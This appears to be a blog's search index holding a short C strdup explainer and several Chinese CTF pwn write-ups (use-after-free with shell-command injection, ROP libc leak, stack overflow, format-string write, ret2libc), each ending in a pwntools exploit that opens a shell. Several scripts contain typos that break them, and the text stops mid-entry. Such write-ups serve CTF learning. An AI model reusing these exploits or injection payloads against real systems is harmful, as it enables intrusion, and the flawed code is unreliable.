<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>strdup函数</title>
      <link href="/misc/5d7e6ffd.html"/>
      <url>/misc/5d7e6ffd.html</url>
      
        <content type="html"><![CDATA[<p><code>strdup</code>函数是对<code>malloc</code>函数的一种封装和扩展, 实现了动态分配内存并复制字符串的功能.<br><code>malloc</code>用于在堆上动态分配内存块, <code>strdup</code>在分配内存的同事, 还将源字符串复制到新分配的内存中, 返回一个指向新字符串的指针.<br><code>strdup</code>:<code>char *strdup(const char *str);</code><br>函数实现:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span> <span class="token function">__strdup</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token class-name">size_t</span> len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>new <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>new <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">memecpy</span><span class="token punctuation">(</span>new<span class="token punctuation">,</span>s<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> C函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-time_formatter</title>
      <link href="/ctf-pwn/4ae9b482.html"/>
      <url>/ctf-pwn/4ae9b482.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>打开于2023年9月13日10:17:58<br>完成于2023年9月14日22:04:40<br>第一次接触到堆题<br>UAF漏洞</p></blockquote><p>先checksec检查一下, 64位程序, 保护基本都开了.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914211140.png" alt="checksec" style="zoom:80%;" /><br>运行程序如下, 有输入输出.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914211238.png" alt="time_formatter" style="zoom:80%;" /><br>用IDA打开看一下主函数如下:<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914211411.png" alt="main" style="zoom: 50%;" /><br>慢慢看吧, 先看<code>set_format</code>函数, 跟进<code>return_malloc_ptr</code>函数,在这里利用<code>fgets</code>来读取输入, 再跟进<code>sub_400C26</code>函数. 可以看到在<code>400C26</code>中使用到了<code>strudp</code>(<a href="http://blog.yangsx.cn/misc/5d7e6ffd.html">strdup函数 | 小哑师兄</a>)函数来进行字符串复制. 由于<code>strdup</code>的是通过<code>malloc</code>函数来实现的, 这里相当于申请了一块堆空间.<code>400C26</code>函数返回了该内存空间的指针给函数<code>return_malloc_ptr</code>, 然后又返回给<code>set_format</code>函数.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914211536.png" alt="set_format" style="zoom:80%;" /><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914211618.png" alt="return_malloc_ptr" style="zoom:80%;" /><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914211745.png" alt="sub_400C26" style="zoom:80%;" /><br>在<code>set_format</code>函数收到返回来的函数指针后,在<code>sub_400CB5</code>中先进行了一个简单的字符串检查(划重点, 后面会提到), 如果检查通过, 则会将在之前申请到的内存空间指针赋值给<code>ptr</code>(<code>ptr</code>为全局变量).<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914212911.png" alt="sub_400CB5" style="zoom:80%;" /><br><code>set_time</code>函数逻辑很清晰, 里面也没有啥需要关注的点<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914213208.png" alt="set_time" style="zoom:80%;" /><br>在<code>set_zone</code>函数中, 也是用<code>return_malloc_ptr</code>函数来返回了一个函数指针并赋值给了<code>value</code>(全局变量)<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914213408.png" alt="image.png" style="zoom:80%;" /><br><code>print_time</code>函数中, 用<code>snprintf_chk</code>函数将要执行的命令写入<code>command</code>中然后由<code>system</code>函数来执行. 在<code>snprintf_chk</code>中, 将<code>ptr</code>所指的值通过格式化字符串<code>%s</code>来赋值.<br><code>system</code>在执行<code>command</code>命令时, 也就是执行<code>system(&quot;/bin/data -d @&lt;number&gt; + ptr&quot;)</code>, 在这里只要将<code>ptr</code>指向的字符串构造为<code>&#39;;command;&#39;</code>即可执行.(Bypass命令注入, 利用<code>&#39;</code>闭合命令来执行新的命令).<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914213620.png" alt="print_time" style="zoom:80%;" /><br>在<code>exit_process</code>函数中, 先去释放<code>ptr</code>和<code>value</code>, 然后让用户来决定是否退出. 这里释放指针后并没有让其指向<code>NULL</code>, 存在<code>UAF</code>漏洞.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230914214000.png" alt="image.png" style="zoom:80%;" /><br>到这里思路就比较清晰了, 要想<code>getshell</code>, 就要利用<code>print_time</code>函数中的<code>system</code>函数来执行命令, 而命令的写入是依靠<code>ptr</code>所指向的字符串. 在<code>set_format</code>函数中有检测, 无法写入<code>;</code>和<code>&#39;</code>, 在<code>set_zone</code>函数中可以写入任意函数. 因为在<code>exit_process</code>函数中释放空间后, 并没让<code>ptr</code>指空, 这时候造成指针悬挂, 如果这时候调用<code>set_zone</code>函数来给<code>value</code>申请内存, 则<code>ptr</code>和<code>value</code>会指向同一内存空间.<br>综上可以通过<code>1, 5, 3, 4</code>的执行顺序来<code>getshell</code>.<br>完整exp如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./time_formatter'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./time_formatter'</span><span class="token punctuation">)</span><span class="token comment"># sh = remote('61.147.171.105', 65452</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">b"1"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Format: "</span><span class="token punctuation">,</span><span class="token string">b"A"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">"5"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Are you sure you want to exit (y/N)? "</span><span class="token punctuation">,</span><span class="token string">b'N'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">b"3"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Time zone: "</span><span class="token punctuation">,</span><span class="token string">b"';/bin/sh;'"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">b"4"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Heap </tag>
            
            <tag> UAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-welpwn</title>
      <link href="/ctf-pwn/eabc8e5d.html"/>
      <url>/ctf-pwn/eabc8e5d.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>打开于2023年9月11日13:39:59<br>完成于2023年9月12日23:30:32<br>这道题目很巧妙</p></blockquote><p>checksec检查, 没有开启什么保护<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230908111328.png" alt="checksec检查" style="zoom:80%;" /><br>首先来看主函数, 用<code>read</code>函数来做一个输入, <code>buf</code>的大小为<code>1024</code>, <code>read</code>也是输入<code>1024</code>, 这里没有可利用的点存在.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912215223.png" alt="main函数" style="zoom:80%;" /><br>跟进<code>echo</code>函数看一下, 在该函数中会将<code>buf</code>复制到<code>s2</code>中, <code>s2</code>的大小是16. 复制过程通过<code>for</code>循环来完成. <code>for</code>循环的结束条件是<code>*(_BYTE *)(i + a1) == 0</code>.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912215533.png" alt="echo函数" style="zoom:80%;" /><br>程序的漏洞点就在<code>echo</code>函数中, 因为将<code>buf</code>复制给<code>s2</code>的过程中可以造成溢出. 通过此处的溢出来完成一系列操作.<br>首先, 因为程序中并没有可以利用的<code>system</code>等, 所以需要通过<code>write</code>或<code>puts</code>来泄漏libc地址<br>其次, 由于<code>for</code>循环的结束条件限制, 构造的payload会被截断. 因为<code>p64</code>地址中存在<code>00</code>填充字符. 如果直接构造<code>payload = b&#39;a&#39; * 16 + b&#39;a&#39; * 8</code> 这样来覆盖<code>echo</code>的返回地址, 并不会成功, 之后保留第一个执行地址, 后面的都会被断掉.<br>在调试过程中发现<code>s2</code>和<code>buf</code>在栈中相距<code>0x20</code>即32, 而且他们之间隔着的是<code>echo rbp</code>和<code>echo ret</code>. 在这里可以利用<code>pop|ret</code>来绕过复制过程中的截断.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912224732.png" alt="buf与echo的栈关系" style="zoom:80%;" /><br>如下图所示, 首先<code>s2</code>的大小是16, 现在构造这样的<code>payload = buf = b&#39;a&#39; * 24 + pop_4_ret + pop_rdi + write_got + puts_plt + main_addr</code>, 那么在复制过程中会在会将<code>pop_4_ret</code>之前的(包括<code>pop</code>)复制到s2的栈中, 会将<code>echo rbp</code>, <code>echo ret</code>给覆盖掉, <code>echo ret</code>变成了<code>pop_4_ret</code>, <code>echo</code>在返回时执行<code>pop_4_ret</code>, 通过四次<code>pop</code>操作, 将栈中接下来的<code>a * 24 + pop_4_ret</code>(图中红色部分)出栈, 然后跳转开始执行<code>pop_rdi</code>这部分<code>payload</code>, 来泄漏地址.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912231313.png" alt="ROP链示意" style="zoom:80%;" /><br>通过<code>ROPgadet</code>在程序中找到<code>pop</code>片段的起始地址为<code>0x40089C</code>–&gt;<code>pop_4_ret = 0x40089C</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912232400.png" alt="pop_4_ret" style="zoom:80%;" /><br>然后通过<code>LibcSearcher</code>由上述<code>payload</code>泄漏出的地址找到对应的<code>libc</code>, 利用<code>libc</code>中的<code>system</code>等来<code>getshell</code>. 第二次溢出<code>getshell</code>的<code>payload</code>与泄漏<code>libc</code>的相似.<br>完整exp如下所示.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> <span class="token number">0x4007CD</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x4008A3</span>pop_4_ret <span class="token operator">=</span> <span class="token number">0x40089C</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_4_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'RCTF'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x40'</span><span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span> write_addr<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>str_bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_4_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>str_bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payloady<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-pwnstack</title>
      <link href="/ctf-pwn/3979423f.html"/>
      <url>/ctf-pwn/3979423f.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目打开于2023年9月12日16:48:06, wp完成于2023年9月12日20:32:44</p></blockquote><p>很简单的一道栈溢出, checksec检查, 没有开什么保护<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912202044.png" alt="checksec检查" style="zoom:80%;" /><br>查一下字符串, <code>system</code>, <code>/bin/sh</code>都有.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912202444.png" alt="检索字符串" style="zoom:80%;" /><br><code>backdoor</code>函数, 函数地址<code>0x400762</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912202652.png" alt="backdoor函数" style="zoom:80%;" /></p><p>有<code>read</code>函数, 直接溢出即可<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912202558.png" alt="溢出点" style="zoom:80%;" /></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span><span class="token comment"># sh = process('./pwn2')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span> <span class="token number">56486</span><span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x400762</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">160</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'this is pwn1,can you do that??'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-实时数据监测</title>
      <link href="/ctf-pwn/31354e41.html"/>
      <url>/ctf-pwn/31354e41.html</url>
      
        <content type="html"><![CDATA[<p>很有意思的一道题<br>checksec检查看有没有开启保护, 32位, 嘛也没开<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905215721.png" style="zoom:80%;" /><br>运行一下, 随便输入后会有输出, 然后给出key的地址<code>0x804a048</code>, 以及key的值不是<code>0x02223322</code>, 结合题目描述, 要想办法修改key的值.<br>上IDA, 进入<code>locker()</code>函数, 只要<code>key==0x2223322</code>就会执行<code>system(&#39;/bin/sh&#39;)</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905220313.png" style="zoom:80%;" /><br>进入<code>imagemagic()</code>函数发现存在格式化字符串漏洞<code>printf</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905220503.png" style="zoom:80%;" /><br>想到利用<code>%n</code>去修改变量的值. 需要去找到输入参数在栈中的偏移量.通过<code>%p</code>来读取16进制值, <code>aaa</code>在栈中的偏移为12.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905220932.png" alt="image.png"><br>根据以上信息就可以构造payload:<code>payload = p32(key_addr) + b&#39;a&#39; * (0x2223322 - 4) + b&#39;%12$n&#39;</code> , 这是的payload在逻辑上没有问题, 但是执行时却会因为输入的a太多而不可行.可以用pwntools自带的<code>fmtstr_payload</code>来构造如下payload:<code>payload = fmtstr_payload(12, &#123;key_addr:0x2223322&#125;)</code><br>也可以利用<code>h</code>与<code>hh</code>来构造,<code>hhn</code> 写入的就是单字节，<code>hn</code>写入的就是双字节</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>key_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>key_addr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>key_addr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>key_addr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">b'%18x'</span> <span class="token operator">+</span> <span class="token string">b'%12$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%17x'</span> <span class="token operator">+</span> <span class="token string">b'%13$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%239x'</span> <span class="token operator">+</span> <span class="token string">b'%14$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%224x'</span> <span class="token operator">+</span> <span class="token string">b'%15$hhn'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>四个p32()是16字符, 然后加上18是34也就是<code>0x22</code>, 在加上17就是51也就是<code>0x33</code>, 再加上239就是290也就是<code>0x122</code>, 然后再加224就是514也就是<code>0x202</code>, 由于hhn写入的是单字节, 依次得到<code>0x22, 0x33, 0x22, 0x02</code>, 又因为小端存储就会得到<code>0x02223322</code>.<br>完整payload如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./datacheck'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./datacheck'</span><span class="token punctuation">)</span><span class="token comment"># sh = remote('61.147.171.105', 65420)</span>key_addr <span class="token operator">=</span> <span class="token number">0x0804a048</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>key_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>key_addr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>key_addr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>key_addr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span>payload <span class="token operator">+=</span><span class="token string">b'%18x'</span> <span class="token operator">+</span> <span class="token string">b'%12$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%17x'</span> <span class="token operator">+</span> <span class="token string">b'%13$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%239x'</span> <span class="token operator">+</span> <span class="token string">b'%14$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%224x'</span> <span class="token operator">+</span> <span class="token string">b'%15$hhn'</span><span class="token comment"># payload1 = fmtstr_payload(12, &#123;key_addr:0x2223322&#125;)</span><span class="token comment"># paylaod2 = p32(key_addr) + b'a' * (0x2223322 - 4) + b'%12$n'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-pwn200</title>
      <link href="/ctf-pwn/7654e13.html"/>
      <url>/ctf-pwn/7654e13.html</url>
      
        <content type="html"><![CDATA[<p>checksec查看附件, 32位小端程序, 开启数据不可执行<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905224945.png" alt="image.png"><br>IDA打开后也没有<code>system</code>等, 有<code>write</code>函数, 猜测是要泄漏libc地址.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905225139.png" alt="image.png"><br>主函数中存在write函数<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905225322.png" alt="image.png"><br>跟进<code>sub_8048484</code>, 里面有read函数, 且可以溢出<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905225407.png" alt="image.png"><br>至此, 思路就比较清晰了, 通过write函数来泄漏libc地址, 然后找到<code>system, bin/sh</code>来getshell.<br>exp如下所示, 但是存在的问题是用LibcSearcher找到的libc库无法利用, 整个exp逻辑上毫无问题, 最后也是找其他师傅的wp看了一下几个地址, 这里还是存在一些小问题</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn200'</span><span class="token punctuation">)</span><span class="token comment"># sh = process('./pwn200')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span> <span class="token number">58215</span><span class="token punctuation">)</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>main_addr <span class="token operator">=</span> <span class="token number">0x80484BE</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">108</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span> <span class="token operator">+</span> \            p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span>\            <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Welcome to XDCTF2015~!\n"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># libc = LibcSearcher('write', write_addr)</span><span class="token comment"># libc_base = write_addr - libc.dump('write')</span><span class="token comment"># system_addr = libc_base + libc.dump('system')</span><span class="token comment"># str_bin_sh = libc_base + libc.dump('str_bin_sh')</span>libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> <span class="token number">0xD43C0</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3A940</span>str_bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x15902B</span><span class="token comment"># payload1 = b'a' * 108 + p32(str_bin_sh) + p32(system_addr)</span>payload1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x70</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>str_bin_sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">,</span> payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 